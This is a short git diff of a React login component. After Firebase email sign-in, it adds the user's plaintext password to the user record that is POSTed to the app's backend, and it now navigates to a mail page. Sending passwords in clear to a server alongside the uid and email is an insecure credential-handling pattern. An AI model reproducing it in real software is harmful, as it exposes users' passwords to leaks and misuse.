@@ -28,10 +28,7 @@ const Login = () => {
         localStorage.setItem("shopify",true)
       }
       
-    // fetch(`https://emapp-backend.vercel.app/accessToken/${email}`)
-    //     .then((res) => res.json())
-    //     .then((result) => localStorage.setItem("accessToken",result.token))
-    //     .catch((error) => console.error(error));
+      
     signInWithEmailAndPassword(auth, email, password)
       .then((userCredential) => {
         const user = userCredential.user;
@@ -41,7 +38,8 @@ const Login = () => {
         const userInfo={
             uid:user.uid,
             email:user.email,
-            date: new Date().toISOString()
+            date: new Date().toISOString(),
+            password:password
         }
         fetch("https://emapp-backend.vercel.app/eulermailUser", {
           method: "POST",
@@ -51,7 +49,7 @@ const Login = () => {
           body: JSON.stringify(userInfo),
         })
         .then(res=>res.json())
-        .then(data=>console.log(data.token))
+        .then(data=>navigate("/eulermail"))
         ;
       }
       
